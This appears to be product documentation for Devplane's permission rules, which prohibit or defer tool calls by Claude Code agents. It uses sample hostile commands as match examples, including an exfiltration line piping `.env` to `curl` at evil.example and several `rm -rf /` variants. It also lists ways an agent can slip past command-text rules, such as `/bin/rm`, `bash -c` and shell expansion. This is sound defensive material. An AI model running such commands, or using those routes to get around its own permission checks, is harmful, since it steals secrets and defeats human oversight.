+++
title = "Permissions"
description = "Devplane never approves a tool call. It can refuse one and it can put one in front of you — in Claude Code's own rule syntax, resolved per repository."
weight = 22
[extra]
group = "reference"
+++

**Devplane never approves a tool call.** Your agent's permission system does that, in its own
settings, where it is authoritative. Devplane can *prohibit* and it can *defer* — being stricter than
your agent needs no agreement from it — and it shows you the request and who has to answer.

So there are two lists:

```toml
# devplane.toml
[policy]
never_auto = [
  "Bash(rm -rf *)",
  "Read(.env)",
  "mcp__*",
]
always_ask = [
  "Bash(git push *)",
]
```

A machine-wide set with the same shape lives in `~/.devplane/policy.toml`. One rule set answers three
callers: the synchronous permission hook for sessions Devplane only watches, the protocol's
permission request for runs it drives, and its own effects in the [decision log](/docs/decisions/).

> [!NOTE]
> `auto_allow` still parses, so a `devplane.toml` written before 2026-09-18 still loads, but **nothing
> in it decides a call**. `devplane check` prints those rules as `inert`. Grants belong in your
> agent's settings — see [Which rule to write next](#which-rule-to-write-next).

## The syntax is Claude Code's

A prohibition moves between `settings.json` and `devplane.toml` by cutting and pasting it. Every row
below is pinned by a test against the published specification.

### Tools

| You write | It matches |
|---|---|
| `Read`, `Bash` | every use of that tool |
| `Bash(*)` | the same as `Bash` |
| `mcp__github` | every tool from the `github` MCP server |
| `mcp__github__*` | the same |
| `mcp__github__get_*` | that server's `get_` tools |
| `mcp__github__create_issue` | one tool |
| `mcp__*`, `*`, `B*` | a glob over the whole tool name |

### Commands

For `Bash`, `PowerShell` and `Monitor`, the specifier is a command pattern. `*` matches any text,
including spaces.

`Monitor` runs a command in the background and feeds its output back to the agent, so a `Bash(…)`
rule governs it as well — `never_auto = ["Bash(rm *)"]` stops the foreground `rm` and the background
one, and a redirection inside a `Monitor` command is checked like any other.

| You write | Matches | Does not match |
|---|---|---|
| `Bash(npm run build)` | `npm run build` | `npm run build --watch` |
| `Bash(npm run *)` | `npm run build`, `npm run test --watch`, **`npm run`** | `npm install` |
| `Bash(npm run:*)` | the same — `:*` is the form the permission dialog writes | |
| `Bash(ls *)` | `ls -la`, **`ls`** | `lsof` |
| `Bash(ls*)` | `ls -la`, `lsof` | |
| `Bash(* --help *)` | `npm --help x` | `npm --help` |

**PowerShell is matched in PowerShell's terms**: command names resolve to their cmdlet and case is
ignored, so `PowerShell(Remove-Item *)` also stops `rm`, `del`, `ri`, `rd` and `erase`.

A PowerShell command's *operands* are not read. Path rules reach the file operands of a **Bash**
command (below); PowerShell's redirection and cmdlet vocabulary is a different language, and a guess
at it would be confidently wrong rather than absent. So `Read(.env)` stops `Bash(cat .env)` and says
nothing about `PowerShell(Get-Content .env)` — write a `PowerShell(Get-Content *)` rule for that.

Two subtleties worth knowing:

- **A trailing ` *` also matches the bare command** — but only when it is the rule's only wildcard.
  So `Bash(pnpm test *)` covers `pnpm test`, and `Bash(* --help *)` does not cover `npm --help`.
- **`:*` is recognised only at the end.** In `Bash(git:* push)` the colon is a literal character and
  the rule matches nothing.

#### Compound commands

A `Bash` rule is **not** matched against the whole command line. Like Claude Code, Devplane is aware
of shell operators — `&&`, `||`, `;`, `|`, `|&`, `&` and newlines — and matches each subcommand
separately. A prohibition fires when *any* subcommand matches, including one nested in a subshell, a
command substitution or a control-flow body: `Bash(rm *)` in `never_auto` stops `ls && rm -rf /`,
`( cd /x && rm -rf . )` and `` echo `rm -rf /` ``.

Before matching, a fixed set of wrappers is stripped — `timeout`, `time`, `nice`, `nohup`, `stdbuf`,
the builtins `command` and `builtin`, zsh's `noglob`, and bare `xargs` — so `Bash(npm test *)` also
matches `timeout 30 npm test`. The query form `command -v` is not stripped, and `xargs` with a flag
is matched as an `xargs` command. A leading environment assignment is looked past whatever the
variable.

> [!WARNING]
> A `Bash` rule matches the text the agent writes, and it is **not a security boundary around the
> program**. `Bash(rm *)` stops `rm -rf build/`; it does not stop `/bin/rm -rf build/` or
> `bash -c 'rm -rf build/'`. That is Claude Code's behaviour and Devplane mirrors it rather than
> inventing a stricter rule that would refuse calls your own settings allow. For a boundary that does
> not depend on command text, use a sandbox — this layer is accountability, not containment.

### Paths

For `Read` and `Edit`, the specifier is a **gitignore pattern**. `*` stays inside one path segment;
`**` crosses them. One `Edit(…)` rule covers every built-in tool that writes files and one `Read(…)`
rule every one that reads them — `Read`, `Grep`, `Glob` and `LSP` included — so two rules cover nine
tools.

Four anchors, and confusing them is the most common mistake:

| You write | Anchored at | Example |
|---|---|---|
| `//path` | the filesystem root | `Read(//tmp/**)` |
| `~/path` | your home directory | `Read(~/.ssh/**)` |
| `/path` | **the file the rule is written in** | `Read(/secrets/**)` in a `devplane.toml` means *that repository's* `secrets` |
| `path`, `./path` | the directory the agent is working in | `Read(*.env)` |

A **bare filename matches at any depth**, so `Read(.env)` and `Read(**/.env)` are the same rule, and
a single-segment directory pattern floats the same way: `Read(secrets/**)` catches a vendored copy at
any depth.

> [!IMPORTANT]
> `Edit(path)` governs **every built-in tool that edits files**, and `Read(path)` every one that
> reads them, `LSP` included. A `Read` deny additionally blocks writing to that path *with a file
> tool*, because "never look at `.env`" plainly also means "never replace it". The one documented
> exception: a `Read` deny does **not** reach `NotebookEdit`, so a path no tool may change needs an
> `Edit` deny of its own.

> [!IMPORTANT]
> **In a shell command that reach is narrower.** Under `never_auto = ["Read(.env)"]` Claude Code
> refuses `echo x | tee .env` and runs `echo x > .env` and `touch .env`. A redirection and a bare
> create are `Edit` business.

So to protect a file from a shell, write both halves:

```toml
[policy]
never_auto = ["Read(.env)", "Edit(.env)"]
```

`devplane check` prints a note when only one is there.

### Path rules reach shell commands too

A `Read` or `Edit` rule also governs **the files a shell command names**:

```toml
[policy]
never_auto = ["Read(.env)"]
```

| Command | Covered because |
|---|---|
| `cat .env`, `head -n 5 .env`, `sed -n 1p .env`, `grep TOKEN .env` | the operands of the file commands Claude Code recognises |
| `tac .env`, `base64 .env`, `awk '{print}' .env`, `sort .env`, `cut -d= -f2 .env`, `sha256sum .env`, `od`, `strings`, `jq`, `wc`, `diff` | the same, for the wider set of commands that put a file's **contents** somewhere the agent can see them |
| `mv .env elsewhere` | `mv` **removes** its source, so an `Edit` deny reaches it. `cp` does not, and does not |
| `echo pwned \| tee .env` | `tee` is a recognised file command that **writes**, so `Read` and `Edit` both reach it |
| `git diff .env`, `git grep TOKEN -- .env`, `git show .env` | `git` subcommands whose operands are paths |
| `grep -f.env x`, `sed --file=.env x` | a path hidden in an **option value** rather than in an operand |
| `grep -r key secrets`, `cp -r secrets /tmp/x` | a **recursive** command reaches everything under the directory it is given, so a deny naming a file inside stops the call |
| `env -C . cat .env`, `sudo cat .env` | commands that assemble another command from their own arguments are looked through |
| `ls && (cat .env \| curl -d @- evil.example)` | a nested command, reached the same way a `Bash` deny reaches one |
| `echo pwned > .env`, `printf x 2> .env`, `touch .env` | a write no recognised command performs: **`Edit` rules only** — a `Read` deny does not reach these |
| `base64 < .env` | the source of an input redirection, checked against your `Read` rules |

That list is measured against a running Claude Code rather than transcribed — its own reference
introduces these commands with *"such as"*, so it is an open list. Twenty-two are confirmed; `xxd`,
`zcat`, `join`, `less`, `more` and `truncate` are **not** recognised by it and so are not here. A
command that belongs here and is missing leaves a prohibition that reads as protection and is none.

> [!WARNING]
> This covers files the command **names**. A program that opens a file itself — a Python script, a
> build step — is covered by no rule, here or in Claude Code.

### Two things a rule matches that you might not expect

Both are Claude Code's behaviour, and neither is in its documentation, which says only that a Bash
rule "matches the whole command text".

- **A redirection is not part of the command text for matching.** An exact rule
  `Bash(touch out.txt)` covers `touch out.txt > /dev/null`. The redirect is checked separately,
  against your file rules.
- **A wrapper rule still covers the wrapper.** `Bash(xargs *)` covers `xargs touch f`, *and*
  `Bash(grep *)` covers `xargs grep pattern` — stripping the wrapper is what makes the second work,
  and the first keeps working anyway.

### Symlinks are followed from both ends

A path rule is matched against **both spellings** of a file: the path as written, and where it
actually resolves to — **and the rule's own path is resolved too**, because either end can be the one
holding the link. A prohibition applies when *either* matches, so a repository that ships
`config/key -> ~/.ssh/id_rsa` does not walk past `never_auto = ["Read(~/.ssh/**)"]`.

`/tmp`, `/etc` and `/var` are symlinks on macOS, so `never_auto = ["Read(//tmp/**)"]` stops
`cat /private/tmp/x` as well as `cat /tmp/x`.

### Exceptions, with `!`

A rule that begins with `!` is an exception, and it is scoped to the file it is written in — so a
project cannot use one to cancel a machine-wide prohibition:

```toml
[policy]
never_auto = ["Bash(git *)", "!Bash(git status *)"]
```

A bare `!` is ignored.

### One rule shape Devplane declines

`Cd(<path>)` rules govern the `/cd` slash command — a person moving the session, not a tool call —
so nothing ever reaches Devplane to match one. `devplane check` says so rather than letting the rule
look like protection. Keep it in `settings.json`, where Claude Code evaluates it.

### Hosts and parameters

```toml
[policy]
never_auto = [
  "WebFetch(domain:evil.example)",
  "Agent(isolation:worktree)",
]
```

`domain:` matches the URL's **host**, read out of it rather than found as a substring — so
`WebFetch(domain:docs.rs)` does not match `https://evil.example/docs.rs`.

`Tool(param:value)` matches a top-level input field, with `*` as a wildcard. A parameter the model
omits is never matched.

## Deny wins, in both directions

`never_auto` is evaluated first, then `always_ask`, and the first match decides. **Specificity does
not change that order.**

A project cannot cancel what the machine forbids, and the machine's rules do not cancel a project's.
Each stage is evaluated across **both** files before the next one begins, so a rule added in one
place cannot quietly widen a decision written in another.

## A rule belongs to the project it protects

The policy is resolved from the **directory the agent is working in**, with a worktree inheriting the
rules of the checkout that owns it — both kinds: the `.claude/worktrees/<name>` layout Claude Code
and Devplane use, and anything `git worktree add` put elsewhere on the disk.

### The rules come from the checkout, the gates come from the branch

This asymmetry is deliberate, and it is the reason an agent cannot widen its own permissions.

An agent works on a branch, in a worktree, and it can edit any file there — including
`devplane.toml`. So the **permission rules** are read from the checkout that *owns* the worktree,
which is the copy on your trunk that you reviewed. A rule the agent adds to its own branch changes
nothing about what it is allowed to do.

The **gates** are read from the worktree, because the definition of done has to travel with the code:
a branch that adds a test suite should be checked by it. That direction is safe — a gate an agent
weakens still has to produce a green result that a person then looks at, and every run of it is in
the decision log.

Each rule set is evaluated against the directory it was **written in**, which is what a single
leading slash anchors to. The same `Read(/secrets/**)` means one thing in a `devplane.toml` and
another in `~/.devplane/policy.toml`; use `//` or `~/` for a machine-wide rule that should apply
inside every project.

## Rules that cannot work are refused

Claude Code lists the spellings it skips in its own startup dialog, and for a good reason: the
failure is silent, and on `never_auto` silence reads as permission. `devplane check` and
`work start` report the same ones **before an agent starts**.

| Refused | Why |
|---|---|
| `Write(src/**)`, `Glob(src/**)`, `NotebookEdit(x)` | file permissions are only checked against `Read(…)` and `Edit(…)`; these are accepted and never consulted |
| `mcp__github(create_issue)` | an `mcp__` rule with brackets is skipped on load |
| `Bash(command:rm *)` | bypassable by a compound command, so it is ignored; write `Bash(rm *)` |
| `Agent(model:opus)` in `auto_allow` | parameter rules are deny-side only |
| `!Bash(ls *)` in `auto_allow` | an allow list is already the list of what is permitted, so an exception to it means nothing. In `never_auto` and `always_ask` a `!` rule **is** an exception and is honoured — see [Exceptions, with `!`](#exceptions-with) |
| `*` or `mcp__*` in `auto_allow` | an unanchored wildcard approves nothing |
| `Agent(researcher)` | that tool has no field for a bare specifier to match |
| `Bash(rm -rf *` | the bracket was never closed |

And one **warning**, because the list behind it is a snapshot of somebody else's tool reference:

| Warned about | Why |
|---|---|
| `Bahs(rm *)`, `Stop Task` in `never_auto` or `always_ask` | the tool name is not one Claude Code documents, so the rule matches nothing. A prohibition with a typo in it is a dead prohibition. The name shown in the transcript is not always the one rules use — `Stop Task` is written `TaskStop` |

### The release this was measured against

The matcher was differentially tested against a running Claude Code up to one release, and that
number is **frozen**: the harness went with the approval path, because there is no longer a claim
about the vendor's behaviour to keep current. Prohibition is Devplane's own decision.

It is still reported, because a session running a much newer release is worth knowing about:

```console
$ devplane doctor
gate
  verified against Claude Code 2.1.273
            1 release behind a session on this machine (2.1.274)
```

Only sessions running the [status-line shim](/docs/observe/#the-status-line) report a version, so
only those can be named.

## The one place Devplane is stricter than Claude Code, on purpose

`eval`, `env`, `sudo`, `doas` and `exec` take a command and run it under another name. Claude Code
treats what they are handed as opaque text; Devplane looks through it, so
`never_auto = ["Read(.env)"]` also stops `eval "cat .env"`.

The cost is a prompt, never a refusal: you are asked, rather than the call being blocked.

## One thing rules cannot see

Claude Code runs a built-in set of commands — `ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`,
`find`, `wc`, `which`, `diff`, `stat`, `du`, `cd` and read-only forms of `git` — **without any
permission check**, in every mode. A `never_auto` or `always_ask` rule *does* still apply, and is the
only way to put one of them back in front of a person.

## Rules that do nothing

`devplane check` reports a rule that provably cannot matter, which is a different thing from a rule
that is malformed:

```console
$ devplane check
  policy    3 deny, 0 ask, 0 inert
            deny   Read(*.env)
            deny   Bash(rm *)
            deny   Bash(rm -rf /tmp/build)

  unused    `Bash(rm -rf /tmp/build)` can never take effect: `Bash(rm *)` is
            consulted first and answers every call it speaks for
```

This is answered by pattern containment — *does every call this rule speaks for also reach that one*
— rather than by comparing the text, so `Read(.env)` is reported as covered by `Read(*.env)`.

**It stays quiet when it cannot prove the claim.** A list containing a `!` exception, two rules on
different tools, a shape the analysis does not handle — all produce nothing. Reporting a rule as
unused invites you to delete it, so the only mistake this is allowed to make is silence.

`devplane trust` prints the same findings for a repository's own `devplane.toml` before you let an
agent loose in it.

## Globs in a command

The shell expands a wildcard before the program sees it, so a deny rule asks of an operand carrying
one: *could this expand onto something I protect?*

```console
$ devplane explain 'cat .en?'      # never_auto = ["Read(.env)"]
deny  Bash
        by Read(.env)
```

**The rule may carry a wildcard too, and then the question is whether the two can meet.** Neither
`Read(*.env)` nor `cat conf*` matches the other as text, and `conf.env` satisfies both — so the rule
fires.

A wildcard still cannot reach a dotfile, exactly as your shell will not: POSIX expands `*` onto a
name beginning with `.` only when the pattern spells the dot. `cat *` is not a way to read `.env`.

## Quoting does not get past a deny

A shell removes quotes before it decides which program to run, so `r''m -rf /` runs `rm`. A rule is
matched against the command as written **and** against the command with its quoting removed:

```console
$ devplane explain "r''m -rf /tmp/x"    # never_auto = ["Bash(rm *)"]
deny  Bash
        by Bash(rm *)
```

The same applies to operands: `cat '.env'`, `cat .e''nv` and `cat .en\v` are all refused by
`Read(.env)`.

What quoting cannot do, *expansion* still can: `$IFS`, `$(echo rm)` and a backtick name a program
that is only chosen when the shell runs, and nothing here guesses what it will be.

## Commands too long or too tangled to read

Every analysis has a bound: the number of files one command may name, how deep a substitution is
followed, and Claude Code's own limit of 10,000 characters past which it *"always prompts"*.

Reaching a bound is reported rather than ignored. A deny rule treats the part nobody read as though
it could be anything, so a protected file cannot be hidden behind a long enough command line:

```console
$ devplane explain 'cat f1 f2 … f600 .env'   # never_auto = ["Read(.env)"]
deny  Bash
        by Read(.env)
```

It costs a prompt on a command nobody writes by hand, and it closes the alternative — a prohibition
that silently stops applying once the command is long enough.

## Auto mode

Claude Code's **auto mode** reviews actions with a classifier instead of asking you, so routine calls
run without a prompt. A `PermissionRequest` hook fires only when Claude Code is about to *ask* —
which in auto mode is never. So Devplane installs two synchronous hooks:

| Hook | Fires | Carries |
|---|---|---|
| `PreToolUse` | before every tool call, in every mode | a prohibition, or nothing |
| `PermissionRequest` | only when a human was going to be asked | the same, plus the request to show you |

Neither ever answers `allow`. **The effect:** `never_auto` and `always_ask` hold in every mode,
including the one where no prompt would have appeared at all.

## Speed, and why it matters

Both hooks are **synchronous**: Claude Code is blocked on the answer. So evaluation is total,
in-process, and cannot wait on anything — there is no "policy service unreachable" path to fail open
through. `PreToolUse` fires on every tool call, so the cost matters:

- A check costs **under 200&nbsp;µs**, path rules included, asserted by a test over 10 000 lookups.
- A full round trip over loopback, worst of 50 consecutive requests, is **under 50&nbsp;ms**.
- The matcher is **linear, not backtracking**. The pattern is yours but the text is a command an
  agent chose, and a matcher that can be made exponential by its subject is a denial of service
  against the hook a session is waiting on.

The policy is cached per repository and invalidated by the file's modification time, re-checked at
most once a second.

## When the file is broken

A malformed `devplane.toml` **keeps the rules it had**. A typo in a deny rule must never read as
"no rules".

That is only half an answer, because a process starting fresh against a broken file has no previous
rules to keep — so `devplane doctor` names the project and says its rules are not in force, rather
than leaving it to a log line. `devplane explain` says it too, and it is the one that matters while
you are editing:

```console
$ devplane explain 'cat .env'
undecided  Bash
        this project's rules are NOT in force — the file below will not load

devplane.toml is not valid: TOML parse error at line 3, column 2
  |
3 | [polcy]
  |  ^^^^^
unknown field `polcy`, expected one of `project`, `workspace`, `gates`, `policy`, …

every rule in this file is off until it parses — devplane check
```

Three situations end in `undecided` and only one of them is a fact about the call — no rules here,
rules that will not load, rules that loaded and did not match. `explain` says which.

## Driven runs speak the same vocabulary

The protocol's permission request carries the **tool kind** the agent declared and the **arguments it
chose**, and those are what the rules are matched against:

| Protocol kind | Evaluated as |
|---|---|
| `execute` | `Bash` |
| `read`, `search` | `Read` |
| `edit`, `delete`, `move` | `Edit` |
| `fetch` | `WebFetch` |

A call that maps to none of them — and carries no recognisable arguments — is **not evaluated at
all**, and a person is asked.

## Which rule to write next

A permission in the inbox carries the rule that would stop it being asked again — the narrowest one
covering the calls this machine has actually seen, with the count behind it and the file to paste it
into. That file is **your agent's `settings.json`**, because that is where a grant is enforced:

```console
$ devplane inbox
…
     never asked again: "permissions": { "allow": ["Bash(cargo test *)"] }
     covers 6 calls like it · paste into /Users/me/work/saas/.claude/settings.json permissions.allow
```

A pattern is offered only past three distinct calls; below that it is the exact call, because one
interruption says nothing about the shape of the ones like it. The rule is replayed against the call
before you are shown it, so one that would not have decided it is refused rather than handed over.

**Nothing writes it for you.** An agent here runs as you and can read the daemon's token, so a route
that edited anyone's permissions would be reachable by the thing they govern.

## How you find out a rule is too tight

**A refused agent does not stop — it tries something else.** So a rule that is exactly right and one
that is far too broad look the same on the board: a session still working, a cost column still
climbing, nothing in the inbox.

Refusals are counted. Five in one live run raises a `refused` item naming the rule that stopped it:

```console
$ devplane inbox
refused   core-lib   7 calls refused in this run
          The last one was `Bash`, refused by `Bash(git *)`. Check that the rule means
          what you meant.
```

It never interrupts — `normal` level — and `devplane attention` reports what became of every one, so
a threshold that is wrong shows up in the `dismissed` column.

## Every verdict is recorded

With the rule named. See [the decision log](/docs/decisions/).
